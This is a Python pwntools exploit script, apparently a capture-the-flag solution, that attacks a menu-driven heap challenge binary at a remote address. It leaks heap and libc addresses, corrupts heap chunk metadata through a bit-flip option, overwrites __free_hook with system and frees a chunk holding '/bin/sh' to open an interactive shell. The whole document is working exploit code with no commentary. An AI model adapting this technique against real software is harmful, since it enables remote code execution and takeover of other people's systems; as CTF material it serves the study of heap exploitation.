from pwn import *

prompt = '>> '


def add(idx, size):
    p.sendlineafter(prompt, '1')
    p.sendlineafter('input\n', str(size))
    p.sendlineafter('index\n', str(idx))


def remove(idx):
    p.sendlineafter(prompt, '2')
    p.sendlineafter('index\n', str(idx))


def edit(idx, payload):
    p.sendlineafter(prompt, '3')
    p.sendlineafter('index\n', str(idx))
    p.send(payload)


def view(n=0):
    p.sendlineafter(prompt, '4')
    return p.recvlines(n)


def change(payload):
    p.sendlineafter(prompt, '5')
    p.sendline(payload)


def flip(addr):
    p.sendlineafter(prompt, '1337')
    p.sendlineafter('Address : ', str(addr))


if __name__ == '__main__':
    if sys.argv[1] == 'local':
        p = process('./buttercup')
    else:
        p = remote('35.190.188.83', 8888)
    e = ELF('./einherjar')
    libc = ELF('./libc.so.6')
    add(0, 10)
    add(1, 10)
    remove(1)
    remove(0)
    add(0, 0)
    heap = u64(view(1)[0].split('=> ')[-1].ljust(8, '\x00'))
    log.success("Leaked heap @ {}".format(hex(heap)))
    add(1, 10)
    add(2, 0x80)
    add(3, 10)
    remove(2)
    add(2, 32)
    libc.address = u64(view(3)[-1].split('=> ')[-1].ljust(8, '\x00'))-0x3c4bf8
    log.success("Leaked libc @ {}".format(hex(libc.address)))
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']
    remove(0)
    remove(1)
    remove(2)
    remove(3)
    add(0, 0x18)
    add(1, 0x80)
    change(p64(0x1e1)*2+p64(heap-0x110)*4)
    payload = fit({0x10: p64(0x1e0)})
    edit(0, payload)
    flip(heap+0xd8)
    remove(1)
    add(1, 0x200)
    payload = fit({0: '/bin/sh\x00', 0x60: p64(free_hook)})
    edit(1, payload)
    edit(0, p64(system))
    remove(1)
    p.interactive()
